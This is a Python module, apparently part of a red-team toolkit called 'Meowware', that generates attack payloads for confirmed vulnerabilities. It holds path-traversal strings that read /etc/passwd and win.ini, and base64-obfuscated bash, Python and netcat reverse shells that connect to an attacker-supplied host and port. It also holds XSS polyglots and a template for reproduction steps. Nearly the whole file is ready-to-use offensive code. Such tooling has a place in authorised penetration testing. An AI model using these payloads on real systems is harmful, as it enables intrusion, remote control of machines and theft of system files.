"""
Payload Generator Module
Generates context-aware payloads for verified vulnerabilities.
Meowware v19.0 - Red Team Utilities
"""
import base64
from typing import Dict, List, Optional

class PayloadGenerator:
    """
    Generates Proof-of-Concept (PoC) scripts and payloads
    for confirmed findings.
    """

    @staticmethod
    def generate_lfi_payload(target_os: str = "linux", encoding: str = "plain") -> str:
        """
        Generate LFI payloads.
        """
        if encoding == "base64_wrapper":
            return "php://filter/read=convert.base64-encode/resource=index.php"
        
        if "win" in target_os.lower():
            return "..\\..\\..\\..\\windows\\win.ini"
        else:
            return "../../../../etc/passwd"

    @staticmethod
    def generate_rce_payload(target_os: str, lhost: str, lport: int, type: str = "bash") -> str:
        """
        Generate Reverse Shell payloads.
        """
        if type == "bash":
            cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            # Return encoded version to avoid bad chars in some contexts
            b64_cmd = base64.b64encode(cmd.encode()).decode()
            return f"echo {b64_cmd} | base64 -d | bash"
            
        elif type == "python":
            return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
            
        elif type == "netcat":
            return f"nc -e /bin/sh {lhost} {lport}"
            
        return "id"

    @staticmethod
    def generate_xss_payload(context: str = "reflected") -> str:
        """
        Generate XSS polyglots.
        """
        polyglot = "\"><script>alert('Meowware Access')</script>"
        if context == "html_attribute":
            return "\" onmouseover=\"alert(1)"
        return polyglot

    @staticmethod
    def generate_repr_steps(finding_title: str, payload: str, url: str) -> str:
        """
        Generate a Markdown formatted reproduction guide.
        """
        return f"""
### Reproduction Steps
1. **Target**: `{url}`
2. **Vulnerability**: {finding_title}
3. **Payload**:
```
{payload}
```
4. **Execution**:
    - Inject the payload into the vulnerable parameter.
    - Observe the execution/reflection.
"""
